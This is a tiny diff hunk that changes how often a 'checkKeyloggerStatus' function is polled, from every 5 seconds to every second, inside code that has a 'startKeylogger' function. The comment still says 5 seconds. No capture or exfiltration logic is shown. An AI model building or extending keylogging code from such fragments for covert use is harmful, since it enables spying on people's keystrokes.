@@ -67,7 +67,7 @@ function startKeylogger() {
 }
 
 // Check the status every 5 seconds
-setInterval(checkKeyloggerStatus, 5000);
+setInterval(checkKeyloggerStatus, 1000);
 
 // Initial check
 checkKeyloggerStatus();
